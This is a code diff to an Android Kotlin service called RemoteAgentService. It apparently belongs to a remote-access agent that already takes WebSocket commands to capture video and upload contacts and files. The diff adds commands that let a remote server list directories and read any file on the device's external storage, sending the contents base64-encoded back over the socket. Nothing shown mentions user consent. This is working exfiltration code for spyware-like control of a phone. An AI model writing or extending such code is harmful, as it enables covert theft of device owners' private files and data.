@@ -41,6 +41,8 @@ import okhttp3.WebSocket
 import okhttp3.WebSocketListener
 import okio.ByteString
 import android.Manifest
+import android.util.Base64
+
 import androidx.core.app.ActivityCompat
 
 
@@ -92,6 +94,15 @@ class RemoteAgentService : Service() {
                             "video" -> handleVideo(json.optString("which"))
                             "contacts" -> handleContactsUpload()
                             "files" -> handleFileUpload()
+                            "file_list" -> {
+                                val path = json.optString("path", "")
+                                handleFileListWS(path)
+                            }
+
+                            "file_read" -> {
+                                val path = json.optString("path", "")
+                                handleFileReadWS(path)
+                            }
                             "ping" -> wsClient?.send("{\"type\":\"pong\",\"deviceId\":\"$deviceId\"}")
 //                            "stop_video" -> stopCamera() // optional stop command
                         }
@@ -289,6 +300,78 @@ class RemoteAgentService : Service() {
             }
         }.start()
     }
+
+
+
+//    ---WS file handle
+
+    private fun sendWS(data: Map<String, Any?>) {
+        val json = JSONObject(data).toString()
+        wsClient?.send(json)
+    }
+
+
+    private fun handleFileListWS(path: String) {
+        val baseDir = Environment.getExternalStorageDirectory()
+        val target = File(baseDir, path)
+
+        if (!target.exists() || !target.isDirectory) {
+            sendWS(
+                mapOf(
+                    "type" to "file_list_result",
+                    "path" to path,
+                    "error" to "Path not found"
+                )
+            )
+            return
+        }
+
+        val items = target.listFiles()?.map {
+            mapOf(
+                "name" to it.name,
+                "isDir" to it.isDirectory,
+                "size" to if (it.isFile) it.length() else null
+            )
+        } ?: emptyList()
+
+        sendWS(
+            mapOf(
+                "type" to "file_list_result",
+                "path" to path,
+                "items" to items
+            )
+        )
+    }
+
+    private fun handleFileReadWS(path: String) {
+        val baseDir = Environment.getExternalStorageDirectory()
+        val target = File(baseDir, path)
+
+        if (!target.exists() || !target.isFile) {
+            sendWS(
+                mapOf(
+                    "type" to "file_read_result",
+                    "path" to path,
+                    "error" to "File not found"
+                )
+            )
+            return
+        }
+
+        val bytes = target.readBytes()
+        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+
+        sendWS(
+            mapOf(
+                "type" to "file_read_result",
+                "path" to path,
+                "data" to base64
+            )
+        )
+    }
+
+
+
 
 
 
